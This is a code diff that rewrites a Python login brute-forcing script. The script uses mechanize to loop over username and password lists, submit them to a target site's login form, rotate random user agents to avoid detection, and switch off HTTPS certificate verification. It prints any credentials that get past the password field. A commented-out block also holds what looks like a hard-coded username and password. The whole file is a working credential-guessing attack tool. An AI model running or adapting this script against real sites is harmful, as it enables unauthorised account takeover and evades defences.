@@ -1,6 +1,9 @@
 import time
 import requests
+from lxml import html
 from scipy import rand
+import mechanize
+import ssl
 
 
 def brute(parameters):
@@ -8,7 +11,7 @@ def brute(parameters):
                'method': parameters['method'],
                'user_param': parameters['user_param'],
                'password_param': parameters['password_param'],
-               'fail_text': parameters['fail_text'],
+               'action' : parameters['action'],
                }
     if parameters['user_list']:
         for user in parameters['user_list']:
@@ -20,13 +23,13 @@ def brute(parameters):
             else:
                 content['password'] = parameters['password']
                 attack(content)
-                
+
     elif parameters['password_list']:
         content['username'] = parameters['username']
         for password in parameters['password_list']:
             content['password'] = password
             attack(content)
-            
+
     else:
         content['username'] = parameters['username']
         content['password'] = parameters['password']
@@ -34,9 +37,41 @@ def brute(parameters):
 
 
 def attack(content):
-    payload = {
-        content['user_param']: content['username'],
-        content['password_param']: content['password'],
+    if isinstance(content['username'], bytes):
+        user = content['username'].decode('utf-8')
+    else:
+        user = content['username']
+    if isinstance(content['password'], bytes):
+        pwd = content['password'].decode('utf-8')
+    else:
+        pwd = content['password']
+    br = mechanize.Browser()
+    br.set_handle_robots(False)
+    try:
+        _create_unverified_https_context = ssl._create_unverified_context
+    except AttributeError:
+        # Legacy Python that doesn't verify HTTPS certificates by default
+        pass
+    else:
+        # Handle target environment that doesn't support HTTPS verification
+        ssl._create_default_https_context = _create_unverified_https_context
+    url = content['url']
+    user_agent = [('User-Agent', get_random_user_agent().encode().decode('utf-8'))]
+    br.addheaders=user_agent
+
+    print('trying' +' username:' + user+' password:'+pwd)
+
+    br.open(url)
+    for form in br.forms():
+        if form.attrs['action'] == content['action']:
+            br.form = form
+    br[content['user_param']] = content['username']
+    br[content['password_param']] = content['password']
+    res = br.submit()
+
+    '''payload = {
+       'username': 'hegleh123',
+        'password':'2X7GB5CZSFGJN',
     }
     headers = {
         'user-agent': get_random_user_agent().encode().decode('utf-8'),
@@ -45,13 +80,15 @@ def attack(content):
     if content['method'] == 'post':
         request = requests.post(content['url'], data=payload, headers = headers)
     else:
-        request = requests.get(content['url'], data=payload, headers = headers)
-    if check_login(request):
-        print('login successfull\n\nusername: ' + content['username'].decode('utf-8') + '\npassword: ' + content['password'].decode('utf-8'))
+        request = requests.get(content['url'], data=payload, headers = headers)'''
+    if check_login(res, content['password_param'], content['user_param']):
+
+        print('login successfull\n\nusername: ' + user + '\npassword: ' + pwd)
         exit(0)
 
 
 def get_random_user_agent():
+    ''' generate a random user_agentto use in the header of the packet'''
     import numpy as np
     random_ua = ''
     ua_file = 'utils/user_agent.txt'
@@ -66,18 +103,31 @@ def get_random_user_agent():
             index = random.permutation(len(lines) - 1)
             idx = np.asarray(index, dtype=np.integer)[0]
             random_proxy = lines[int(idx)]
-            return random_proxy[2:len(random_proxy)-2] # need to fix this later
+            return random_proxy[2:len(random_proxy) - 2]  # need to fix this later
     except Exception as ex:
         print('Exception in user agent')
         print(str(ex))
     finally:
-        return random_proxy[2:len(random_proxy)-2]
+        return random_proxy[2:len(random_proxy) - 2]
 
-def check_login(request):
-    if 'Dashboard' in request.text:
-        return True
-    if request.text.__contains__('token'):
-        return True
-    # print(request.text)
-    return False
 
+def check_login(content, password_param, user_param):
+    pass_param = 'type="password" name="' + password_param + '"'
+    pass_param1 = 'name="'+password_param + '"'+'type="password" '
+    read = str(content.read())
+    doc = html.document_fromstring(read)
+    element = doc.xpath('//input[@type="password"]')
+
+    '''if read.find(pass_param) > 0 or read.find(pass_param1) > 0:
+            return False'''
+    for field in element:
+     if field.get('name') == password_param:
+         return False
+
+
+    if content.code != 200:
+        print(content.code)
+        return False
+    else:
+        #print(content.read)
+        return True
